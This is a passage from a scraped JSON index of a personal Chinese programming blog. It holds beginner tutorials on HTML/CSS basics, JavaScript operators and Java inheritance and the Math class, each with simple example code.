p元素不可以包含任何块元素 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"background-color:red;\"&gt;我是一个块元素&lt;/div&gt; &lt;span style=\"background-color:blue;\"&gt;我是一个内联元素&lt;/span&gt; &lt;a href=\"#\"&gt; &lt;div&gt;我被a元素包含&lt;/div&gt; &lt;/a&gt; &lt;!-- 错误写法 --&gt; &lt;p&gt; &lt;p&gt;我是错误写法&lt;/p&gt; &lt;/p&gt; &lt;span&gt; &lt;div&gt; 我是错误写法 &lt;/div&gt; &lt;/span&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"CSS语法","slug":"html-css00016CSS语法","date":"2020-03-05T07:11:34.000Z","updated":"2020-03-05T07:19:53.475Z","comments":true,"path":"2020/03/05/html-css00016CSS语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/05/html-css00016CSS语法/","excerpt":"","text":"CSS语法 CSS中的注释，注释中的内容会自动被浏览器所忽略 HTML中的&lt;!----&gt;注释在&lt;style&gt;标签内或css文件中是不能使用的 css注释语法 123/*注释内容*/ CSS的基本语法: 选择器 声明块 1234p&#123; 属性名1:值; 属性名2:值;&#125; 选择器，通过选择器可以选中页面中的指定元素 比如 p 的作用就是选中页面中所有的p元素 声明块，通过声明块来指定要为元素设置的样式 声明块由一个一个的声明组成 声明是一个名值对结构 一个样式名对应一个样式值，名和值之间以:连接，以;结尾 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; p&#123; color: red; font-size: 40px; &#125; h1&#123; color: green; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;我是H1&lt;/h1&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt; &lt;p&gt;今天天气真不错！&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"css简介","slug":"html-css00015css简介","date":"2020-03-04T10:18:17.000Z","updated":"2020-03-04T10:44:14.901Z","comments":true,"path":"2020/03/04/html-css00015css简介/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/html-css00015css简介/","excerpt":"","text":"css简介 网页分成三个部分： 结构(HTML) 表现(CSS) 行为(JavaScript) CSS 层叠样式表 网页实际上是一个多层的结构，通过CSS可以分别为网页的每一个层来设置样式 而最终我们能看到只是网页的最上边一层 总之一句话，CSS用来设置网页中元素的样式 使用CSS来修改元素的样式 第一种方式(内联样式，行内样式)： 在标签内部通过style属性来设置元素的样式 问题： 使用内联样式，样式只能对一个标签生效， 如果希望影响到多个元素必须在每一个元素中都复制一遍 并且当样式发生变化时，我们必须要一个一个的修改，非常的不方便 注意： 开发时绝对不要使用内联样式 &lt;p style=&quot;color:red; font-size: 60px;&quot;&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt; &lt;p style=&quot;color: red; font-size: 60px;&quot;&gt;今天天气真不错！&lt;/p&gt; 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 我是内联样式 --&gt;&lt;p style=\"color:red; font-size: 60px;\"&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt;&lt;p style=\"color:red; font-size: 60px;\"&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt;&lt;p style=\"color:red; font-size: 60px;\"&gt;少小离家老大回，乡音无改鬓毛衰&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 第二种方式（内部样式表） 将样式编写到head中的style标签里 然后通过CSS的选择器来选中元素并为其设置各种样式 可以同时为多个标签设置样式，并且修改时只需要修改一处即可全部应用 内部样式表更加方便对样式进行复用 问题： 我们的内部样式表只能对一个网页起作用， 它里边的样式不能跨页面进行复用 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; p&#123; color: green; font-size: 50px; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;少小离家老大回，乡音无改鬓毛衰&lt;p&gt; &lt;/body&gt;&lt;/html&gt; 第三种方式 （外部样式表） 最佳实践 可以将CSS样式编写到一个外部的CSS文件中, 然后通过link标签来引入外部的CSS文件 外部样式表需要通过link标签进行引入， 意味着只要想使用这些样式的网页都可以对其进行引用 使样式可以在不同页面之间进行复用 将样式编写到外部的CSS文件中，可以使用到浏览器的缓存机制， 从而加快网页的加载速度，提高用户的体验。 例如有一个网站X,一个网站通常有多个页面,如果多个页面共用一个css样式文件时,当用户打开A页面时,需要加载css文件,但当用户打开B页面或C页面时就不需要加载了.这就是缓存 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"./style.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt; 少小离家老大回，乡音无改鬓毛衰 &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; style.css 1234 p&#123; color: green; font-size: 50px;&#125;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"JS条件运算符","slug":"JS00024条件运算符","date":"2020-03-04T09:35:31.000Z","updated":"2020-03-04T09:41:48.361Z","comments":true,"path":"2020/03/04/JS00024条件运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00024条件运算符/","excerpt":"","text":"JS条件运算符 条件运算符也叫三元运算符 语法： 条件表达式?语句1:语句2; 执行的流程： 条件运算符在执行时，首先对条件表达式进行求值， 如果该值为true，则执行语句1，并返回执行结果 如果该值为false，则执行语句2，并返回执行结果 如果条件的表达式的求值结果是一个非布尔值， 会将其转换为布尔值然后在运算 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; //false?alert(\"语句1\"):alert(\"语句2\"); var a = 300; var b = 143; var c = 50; //a &gt; b ? alert(\"a大\"):alert(\"b大\"); //获取a和b中的最大值 //var max = a &gt; b ? a : b; //获取a b c 中的大值 //max = max &gt; c ? max : c; //这种写法不推荐使用，不方便阅读 var max = a &gt; b ? (a &gt; c ? a :c) : (b &gt; c ? b : c); //console.log(\"max = \"+max); //\"hello\"?alert(\"语句1\"):alert(\"语句2\"); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS相等运算符","slug":"JS00023相等运算符","date":"2020-03-04T07:51:43.000Z","updated":"2020-03-04T08:12:42.267Z","comments":true,"path":"2020/03/04/JS00023相等运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00023相等运算符/","excerpt":"","text":"JS相等运算符 相等运算符用来比较两个值是否相等， 如果相等会返回true，否则返回false 使用 == 来做相等运算 当使用==来比较两个值时，如果值的类型不同， 则会自动进行类型转换，将其转换为相同的类型 然后在比较 不相等!= 不相等用来判断两个值是否不相等，如果不相等返回true，否则返回false 使用!=来做不相等运算 不相等也会对变量进行自动的类型转换，如果转换后相等它也会返回false 全等=== - 用来判断两个值是否全等，它和相等类似，不同的是它不会做自动的类型转换 如果两个值的类型不同，直接返回false 不全等!== - 用来判断两个值是否不全等，和不等类似，不同的是它不会做自动的类型转换 如果两个值的类型不同，直接返回true 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; //console.log(1 == 1); //true var a = 10; //console.log(a == 4); //false //console.log(\"1\" == 1); //true //console.log(true == \"1\"); //true //console.log(null == 0); //false /* * undefined 衍生自 null * 所以这两个值做相等判断时，会返回true */ //console.log(undefined == null); /* * NaN不和任何值相等，包括他本身 */ //console.log(NaN == NaN); //false var b = NaN; //判断b的值是否是NaN //console.log(b == NaN); /* * 可以通过isNaN()函数来判断一个值是否是NaN * 如果该值是NaN则返回true，否则返回false */ //console.log(isNaN(b)); //console.log(10 != 5); //true //console.log(10 != 10); //false //console.log(\"abcd\" != \"abcd\"); //false //console.log(\"1\" != 1);//false //console.log(\"123\" === 123);//false //console.log(null === undefined);//false console.log(1 !== \"1\"); //true &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS中Unicode编码使用","slug":"JS00022Unicode编码使用","date":"2020-03-04T07:20:38.000Z","updated":"2020-03-04T07:27:01.794Z","comments":true,"path":"2020/03/04/JS00022Unicode编码使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00022Unicode编码使用/","excerpt":"","text":"JS中Unicode编码使用 在JS中使用Unicode编码. 格式: \\u编码(十六进制) 编码一般都是十六进制的 在html中使用unicode编码. 格式: &amp;#编码;(十进制) 后面一定要有分号. 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; /* * 在字符串中使用转义字符输入Unicode编码 * \\u四位编码 */ console.log(\"\\u2620\"); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;!--在网页中使用Unicode编码 &amp;#编码; 这里的编码需要的是10进制 --&gt; &lt;h1 style=\"font-size: 200px;\"&gt;&amp;#9760;&lt;/h1&gt; &lt;h1 style=\"font-size: 200px;\"&gt;&amp;#9856;&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS关系运算符","slug":"JS00021关系运算符","date":"2020-03-04T06:58:02.000Z","updated":"2020-03-04T07:05:39.386Z","comments":true,"path":"2020/03/04/JS00021关系运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00021关系运算符/","excerpt":"","text":"JS关系运算符 通过关系运算符可以比较两个值之间的大小关系， 如果关系成立它会返回true，如果关系不成立则返回false &gt; 大于号 - 判断符号左侧的值是否大于右侧的值 - 如果关系成立，返回true，如果关系不成立则返回false &gt;= 大于等于 - 判断符号左侧的值是否大于或等于右侧的值 &lt; 小于号 &lt;= 小于等于 非数值的情况 - 对于非数值进行比较时，会将其转换为数字然后在比较 - 如果符号两侧的值都是字符串时，不会将其转换为数字进行比较 而会分别比较字符串中字符的Unicode编码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; var result = 5 &gt; 10;//false result = 5 &gt; 4; //true result = 5 &gt; 5; //false result = 5 &gt;= 5; //true result = 5 &gt;= 4; //true result = 5 &lt; 4; //false result = 4 &lt;= 4; //true //console.log(\"result = \"+result); //console.log(1 &gt; true); //false //console.log(1 &gt;= true); //true //console.log(1 &gt; \"0\"); //true //console.log(10 &gt; null); //true //任何值和NaN做任何比较都是false //console.log(10 &lt;= \"hello\"); //false //console.log(true &gt; false); //true //console.log(\"1\" &lt; \"5\"); //true //console.log(\"11\" &lt; \"5\"); //true //比较两个字符串时，比较的是字符串的字符编码 //console.log(\"a\" &lt; \"b\");//true //比较字符编码时是一位一位进行比较 //如果两位一样，则比较下一位，所以借用它来对英文进行排序 //console.log(\"abc\" &lt; \"bcd\");//true //比较中文时没有意义 //console.log(\"戒\" &gt; \"我\"); //true //如果比较的两个字符串型的数字，可能会得到不可预期的结果 //注意：在比较两个字符串型的数字时，一定一定一定要转型 console.log(\"11123123123123123123\" &lt; +\"5\"); //true &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS赋值运算符","slug":"JS00020赋值运算符","date":"2020-03-04T06:39:30.000Z","updated":"2020-03-04T06:44:47.029Z","comments":true,"path":"2020/03/04/JS00020赋值运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00020赋值运算符/","excerpt":"","text":"JS赋值运算符 = 可以将符号右侧的值赋值给符号左侧的变量 += a += 5 等价于 a = a + 5 -= a -= 5 等价于 a = a - 5 *= a \\*= 5 等价于 a = a \\* 5 /= a /= 5 等价于 a = a / 5 %= a %= 5 等价于 a = a % 5 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt; &lt;/title&gt; &lt;script type=\"text/javascript\"&gt; var a = 10; //a = a + 5; //a += 5; //a -= 5; //a *= 5; // a = a%3; a %= 3; console.log(\"a = \"+a); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS非布尔值的与或运算","slug":"JS00019非布尔值的与或运算","date":"2020-03-04T06:30:12.000Z","updated":"2020-03-04T06:35:58.138Z","comments":true,"path":"2020/03/04/JS00019非布尔值的与或运算/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00019非布尔值的与或运算/","excerpt":"","text":"JS非布尔值的与或运算 &amp;&amp; || 非布尔值的情况 ​ - 对于非布尔值进行与或运算时， ​ 会先将其转换为布尔值，然后再运算，并且返回原值 ​ - 与运算： ​ - 如果第一个值为true，则必然返回第二个值 ​ - 如果第一个值为false，则直接返回第一个值 - 或运算 ​ - 如果第一个值为true，则直接返回第一个值 ​ - 如果第一个值为false，则返回第二个值 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; //true &amp;&amp; true //与运算：如果两个值都为true，则返回后边的 var result = 5 &amp;&amp; 6; //与运算：如果两个值中有false，则返回靠前的false //false &amp;&amp; true result = 0 &amp;&amp; 2; result = 2 &amp;&amp; 0; //false &amp;&amp; false result = NaN &amp;&amp; 0; result = 0 &amp;&amp; NaN; //true || true //如果第一个值为true，则直接返回第一个值 result = 2 || 1; result = 2 || NaN; result = 2 || 0; //如果第一个值为false，则直接返回第二个值 result = NaN || 1; result = NaN || 0; result = \"\" || \"hello\"; result = -1 || \"你好\"; console.log(\"result = \"+result); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS逻辑运算符","slug":"JS00018逻辑运算符","date":"2020-03-04T05:57:47.000Z","updated":"2020-03-04T06:20:25.112Z","comments":true,"path":"2020/03/04/JS00018逻辑运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/04/JS00018逻辑运算符/","excerpt":"","text":"JS逻辑运算符 JS中为我们提供了三种逻辑运算符 ! 非 - !可以用来对一个值进行非运算 - 所谓非运算就是值对一个布尔值进行取反操作， 变false，false变true - 如果对一个值进行两次取反，它不会变化 - 如果对非布尔值进行元素，则会将其转换为布尔值，然后再取反 所以我们可以利用该特点，来将一个其他的数据类型转换为布尔值 可以为一个任意数据类型取两次反，来将其转换为布尔值， 原理和Boolean()函数一样 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //取反 var a = true; a = !a; console.log(\"a:\" + a); //不会变化 var b = true; console.log(\"b:\" + !!b); var c = 1; console.log(\"c:\" + !!c); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; &amp;&amp; 与 - &amp;&amp;可以对符号两侧的值进行与运算并返回结果 - 运算规则 - 两个值中只要有一个值为false就返回false， 只有两个值都为true时，才会返回true - JS中的“与”属于短路的与， 如果第一个值为false，则不会看第二个值 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a = true &amp;&amp; true; console.log(\"a:\" + a);//true a = true &amp;&amp; false; console.log(\"a:\" + a);//true a = true &amp;&amp; alert(\"我出来了\"); a = false &amp;&amp; alert(\"我不出来了\"); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; || 或 - ||可以对符号两侧的值进行或运算并返回结果 - 运算规则： - 两个值中只要有一个true，就返回true 如果两个值都为false，才返回false - JS中的“或”属于短路的或 如果第一个值为true，则不会检查第二个值 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a = true || false; console.log(\"a:\" + a); a = false || false; console.log(\"a:\" + a); false || alert(\"我出来了\"); true || alert(\"我不出来\"); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS自增自减运算符","slug":"JS00017自增自减运算符","date":"2020-03-03T14:12:16.000Z","updated":"2020-03-03T14:30:44.900Z","comments":true,"path":"2020/03/03/JS00017自增自减运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/JS00017自增自减运算符/","excerpt":"","text":"JS自增自减运算符 ++ 分为前++(++a)和后++ (a++) 前++ (++a),先加1,再使用. 后++ (a++),先使用,再加1. -- 分为前-- (--a)和后-- (a--) 前-- (--a),先减1,再使用. 后-- (a--),先使用,再减1. 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a = 10; console.log(a++);//10 console.log(++a);//12 var b = 10; console.log(b--);//10 console.log(--b);//8 &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS一元运算符","slug":"JS00016一元运算符","date":"2020-03-03T14:02:44.000Z","updated":"2020-03-03T14:10:19.467Z","comments":true,"path":"2020/03/03/JS00016一元运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/JS00016一元运算符/","excerpt":"","text":"JS一元运算符 正号: + 负号: - 如果是非Number,会自动转换为Number类型 1234567891011121314&lt;script&gt; var a = 10; console.log(\"a = \" + -a); console.log(\"a = \" + +a); var str = \"123\"; var b = 1 + +str; console.log(b); b = 124 + -str; console.log(b); &lt;/script&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"hexo常用命令","slug":"hexo常用命令","date":"2020-03-03T12:00:08.000Z","updated":"2020-03-03T12:04:54.837Z","comments":true,"path":"2020/03/03/hexo常用命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/hexo常用命令/","excerpt":"","text":"","categories":[{"name":"githubHexo","slug":"githubHexo","permalink":"https://xiaowuyoucy.github.io/categories/githubHexo/"}],"tags":[]},{"title":"java继承中方法的覆盖重写","slug":"java00079继承中方法的覆盖重写","date":"2020-03-03T11:27:05.000Z","updated":"2020-03-03T11:48:07.188Z","comments":true,"path":"2020/03/03/java00079继承中方法的覆盖重写/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00079继承中方法的覆盖重写/","excerpt":"","text":"java继承中方法的覆盖重写 重写(Override) 概念:在继承关系当中,方法的名称一样,参数列表也一样. 注意事项: 1.必须保证父子类之间方法的名称相同,参数也相同. @Override:写在方法前面,用来检测是不是有效的正确覆盖重写. @Override就算不写只要满足要求,也是正确的方法覆盖重写. 2.子类方法的返回值必须小于等于父类方法的返回值范围 java.lang.Object类是所有类的公共最高父类(祖宗类),java.lang.String就是Object的子类. 3.子类方法的权限必须大于等于父类方法的权限修饰符. public &gt; protected &gt; default &gt; private (default)不是关键字default,而是什么都不写,留空 12345678910111213141516171819202122package xiaochenyan.top.Demo001;public class Main01&#123; public static void main(String[] args) &#123; Fu fu = new Fu(); Zi zi = new Zi(); System.out.println(fu.num);//100 System.out.println(zi.num);//200 System.out.println(\"=============================================\"); zi.show(); /* 100 10 200 100 */ &#125;&#125; 12345678910111213141516171819package xiaochenyan.top.Demo001;public class Zi extends Fu&#123; int num; Zi()&#123; num = 200; &#125; @Override public void show() &#123; super.show();//保持父类的原内容不变,添加自己的新功能 int num = 10; System.out.println(num); System.out.println(this.num); System.out.println(super.num); &#125;&#125; 1234567891011121314package xiaochenyan.top.Demo001;public class Fu&#123; int num; Fu()&#123; num = 100; &#125; public void show() &#123; System.out.println(num); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java区分子类方法中重名的三种变量","slug":"java00078区分子类方法中重名的三种变量","date":"2020-03-03T06:10:51.000Z","updated":"2020-03-03T06:19:30.597Z","comments":true,"path":"2020/03/03/java00078区分子类方法中重名的三种变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00078区分子类方法中重名的三种变量/","excerpt":"","text":"java区分子类方法中重名的三种变量 局部变量: 直接写成员变量 本类的成员变量: this.成员变量 父类的成员变量: super.成员变量名 1234567891011121314package xiaochenyan.top.Demo001;public class Fu&#123; int num; Fu()&#123; num = 100; &#125; public void show() &#123; System.out.println(num); &#125;&#125; 1234567891011121314151617package xiaochenyan.top.Demo001;public class Zi extends Fu&#123; int num; Zi()&#123; num = 200; &#125; public void show() &#123; int num = 10; System.out.println(num);//使用局部num System.out.println(this.num);//使用本类num System.out.println(super.num);//使用父类num &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承中成员变量的访问特点","slug":"java00077继承中成员变量的访问特点","date":"2020-03-03T05:53:10.000Z","updated":"2020-03-03T06:05:40.494Z","comments":true,"path":"2020/03/03/java00077继承中成员变量的访问特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00077继承中成员变量的访问特点/","excerpt":"","text":"java继承中成员变量的访问特点 如果父类和子类的成员变量重名. 直接通过子类对象访问成员变量: 子类名.成员变量名(优先使用子类的重名成员变量) 间接通过成员方法访问成员变量: 方法属于A类的方法,就优先使用A类重名的成员变量 在父类和子类中,只要有方法或变量重名的,对象属于A类,就优先使用A类对象重名的变量或方法 1234567891011121314151617package xiaochenyan.top.Demo001;public class Main01&#123; public static void main(String[] args) &#123; Fu fu = new Fu(); Zi zi = new Zi(); System.out.println(fu.num);//100 System.out.println(zi.num);//200 System.out.println(\"===========================\"); fu.show();//100 zi.show();//200; &#125;&#125; 123456789101112public class Fu&#123; int num; Fu()&#123; num = 100; &#125; public void show() &#123; System.out.println(num); &#125;&#125; 1234567891011121314package xiaochenyan.top.Demo001;public class Zi extends Fu&#123; int num; Zi()&#123; num = 200; &#125; public void show() &#123; System.out.println(num); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承格式","slug":"java00076继承格式","date":"2020-03-03T04:52:58.000Z","updated":"2020-03-03T05:08:19.975Z","comments":true,"path":"2020/03/03/java00076继承格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00076继承格式/","excerpt":"","text":"java继承格式 子类定义语法: 123public class 子类名 extends 父类名称&#123; //代码块&#125; 1234567891011package xiaochenyan.top.fuZiLei;public class demo01&#123; public static void main(String[] args) &#123; Teacher xiaoMing = new Teacher(); xiaoMing.setAge(23); xiaoMing.setName(\"XiaoMing\"); xiaoMing.show(); &#125;&#125; 子类会继承父类的公有成员函数或公有变量. 1234567package xiaochenyan.top.fuZiLei;public class Teacher extends YuanGong&#123; Teacher()&#123; show(); &#125;&#125; 父类 1234567891011121314151617181920212223242526272829303132333435363738package xiaochenyan.top.fuZiLei;public class YuanGong&#123; public String name; public int age; public YuanGong(String name, int age) &#123; this.name = name; this.age = age; &#125; public YuanGong() &#123; name = null; age = 0; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; //输出公有成员变量 public void show() &#123; System.out.println(\"姓名:\"+name); System.out.println(\"年龄:\"+age); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承的概述","slug":"java00075继承的概述","date":"2020-03-03T04:44:09.000Z","updated":"2020-03-03T04:46:28.854Z","comments":true,"path":"2020/03/03/java00075继承的概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00075继承的概述/","excerpt":"","text":"java继承的概述","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java小学数学真题","slug":"java00074小学数学真题","date":"2020-03-03T04:25:46.000Z","updated":"2020-03-03T04:36:55.974Z","comments":true,"path":"2020/03/03/java00074小学数学真题/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00074小学数学真题/","excerpt":"","text":"java小学数学真题 计算从-10.8到5.9之间,绝对值大于6或者小于2.1的整数有多少个? 12345678910111213141516171819package xiaochenyan.top.Demo;public class Main21&#123; public static void main(String[] args) &#123; int count = 0; double min = -10.8; double max = 5.9; for (double i = min; i &lt; max; i++) &#123; double num = Math.ceil(i); double abS = Math.abs(num); if (abS &gt; 6 || abS &lt; 2.1) &#123; ++count; &#125; &#125; System.out.println(count); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数学工具类Math","slug":"java00073数学工具类Math","date":"2020-03-03T04:10:55.000Z","updated":"2020-03-03T04:24:18.410Z","comments":true,"path":"2020/03/03/java00073数学工具类Math/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00073数学工具类Math/","excerpt":"","text":"java数学工具类Math java.lang.Math类是数学相关的工具类,里面提供了大量的静态方法,完成与数学运算的操作. public static double abs(double num):获取绝对值. public static double ceil(double num):向上取整. public static double floor(double num):向下取整. public static long round(double num):四舍五入. Math.PI代表圆周率 123456789101112131415161718192021222324252627282930313233package xiaochenyan.top.Demo;public class Main20&#123; public static void main(String[] args) &#123; double a = 31.2; double b = 31.9; double c = 31.0; //取绝对值 System.out.println(Math.abs(-31));//32 System.out.println(\"==========================================\"); //向上取整 System.out.println(Math.ceil(a));//32 System.out.println(Math.ceil(b));//32 System.out.println(Math.ceil(c));//32 //向下取整 System.out.println(\"==========================================\"); System.out.println(Math.floor(a));//31 System.out.println(Math.floor(b));//31 System.out.println(Math.floor(c));//31 System.out.println(\"==========================================\"); //四舍五入 System.out.println(Math.round(a));//31 System.out.println(Math.round(b));//32 System.out.println(Math.round(c));//31 System.out.println(\"==========================================\"); //圆周率 System.out.println(Math.PI);//3.141592653589793 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java将字符串转换为字符数组","slug":"java00072将字符串转换为字符数组","date":"2020-03-03T04:02:50.000Z","updated":"2020-03-03T04:09:06.916Z","comments":true,"path":"2020/03/03/java00072将字符串转换为字符数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/03/java00072将字符串转换为字符数组/","excerpt":"","text":"java将字符串转换为字符数组 格式: 字符串.toCharArray() 返回一个字符数组 12345678910111213package xiaochenyan.top.Demo;public class Main19&#123; public static void main(String[] args) &#123; String str = \"agsagasfsdtahsa\"; //将字符串转换为字符数组 char[] chars = str.toCharArray(); for (int i = 0; i &lt; chars.length; i++) &#123; System.out.println(chars[i]); &#125; 